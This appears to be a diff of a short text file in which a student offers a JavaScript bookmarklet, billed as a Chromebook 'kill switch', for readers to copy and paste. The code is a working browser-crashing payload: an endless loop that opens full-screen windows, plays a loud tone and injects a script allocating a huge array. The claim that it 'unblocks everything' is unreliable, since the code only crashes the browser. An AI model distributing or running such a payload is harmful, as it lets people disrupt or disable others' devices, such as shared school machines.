@@ -2,6 +2,8 @@
 ok... i was bored at school so i decided to make a kill switch for chrome book it will unblock everything and this will destroy your Chromebook 
 this is the first this will make many tabs untill it chrashes your computer/pc.etc... this will work for book marklets too ENJOYY : ) 
 FUN WITH SHREK  just copy the link and dont click on the blue link 
+
+this will open many tabs at one untill your computer/pc etc... crashes enjoy
 -------------------------------------------------
 javascript:while(true) {  var a=Math.floor(10000*Math.random()+1),  b=window.open('_blank','Lag'+a,`height=${screen.height},width=${screen.width}`);  au=new AudioContext(); v=au.createOscillator(); u=au.createGain(); v.connect(u); v.frequency.value=130; v.type="square"; u.connect(au.destination); u.gain.value=100*0.01; v.start(au.currentTime); v.stop(au.currentTime+300*0.001);  b.document.body.innerHTML='<script>[...Array(2**32-1)]</script>';}
 just copyy and paste it 
